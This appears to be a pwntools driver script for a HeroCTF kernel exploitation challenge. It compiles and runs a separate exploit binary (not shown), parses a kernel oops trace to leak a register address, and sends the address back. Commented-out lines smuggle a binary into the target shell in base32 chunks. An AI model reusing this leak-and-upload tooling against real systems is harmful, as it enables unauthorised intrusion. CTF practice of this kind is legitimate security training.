from pwn import *
import pwn
import os
import re
import random as rnd
import base64 as b64
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./run.sh"
# file = "./run"
args = []
io: process = None

speed = 0.1

def debug():
    run_in_new_terminal("./gdb.sh")
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="dyn04.heroctf.fr", port=11936)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

# exe = ELF(file)
# libc = ELF("./libc.so.6")

SLICE_SIZE = 0x200
HOME = "/tmp/"

def exploit():
    # sleep(10)
    # with open("exploit.gz", "rb") as f:
    #     code = b64.b32encode(f.read()).decode()
    # code = [code[i:i+SLICE_SIZE] for i in range(0, len(code), SLICE_SIZE)]


    # recvu(b"Enter 'help' for a list of built-in commands.")
    # sleep(speed)

    # prog = log.progress("sending exploit")
    # for i in range(len(code)):
    #     prog.status(f"{i}/{len(code)}")
    #     sla(b"$ ", f'echo -n "{code[i]}" >> {HOME}/exploit_tmp'.encode())
    # prog.success()

    # sla(b"$ ", f"base32 -d {HOME}/exploit_tmp > {HOME}/exploit.gz".encode())
    # sla(b"$ ", f"gzip -d {HOME}/exploit.gz".encode())
    # sla(b"$ ", f"rm {HOME}/exploit_tmp".encode())
    # sla(b"$ ", f"chmod +x {HOME}/exploit".encode())

    # input("run")

    recvu(b"You have one bullet, use it wisely...")


    sla(b"$ ", f"/exploit/exploit".encode())

    recvu(b"CPU: 0 PID: 0")
    leak = recvu(b"end trace")
    leak = getb(leak, b"x21: ", b"\n")
    leak = int(leak, 16)

    sl(str(hex(leak)).encode())

    while True:
        try:
            for i in range(0x10):
                leak = io.recv(timeout=0.5)
                if b"Assertion failed" in leak:
                    raise EOFError
                # leak = re.sub(b"\x1b.+?m", b"", leak)
                leak = re.sub(b"\r", b"", leak)
                print(leak.decode("iso-8859-1"))
                sleep(speed)
        except KeyboardInterrupt:
            io.sendline(input().encode())

    input("end")
    exit()

os.system("/opt/aarch64-linux-musl-cross/bin/aarch64-linux-musl-gcc exploit.c -o ./shared/exploit -static -s")
# os.system("gzip -f exploit")

while True:
    try:
        launch()
        exploit()
    except:
        pass
    io.close()

